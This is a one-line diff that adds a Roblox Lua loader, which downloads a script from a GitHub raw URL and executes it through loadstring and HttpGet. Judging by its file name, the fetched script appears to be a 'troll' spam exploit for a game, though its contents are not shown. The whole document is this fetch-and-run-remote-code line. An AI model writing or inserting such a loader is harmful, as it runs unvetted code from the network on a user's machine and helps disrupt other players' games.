@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/troll-hug-tower-spam7-7n5pv8kogtswzs.lua"))()
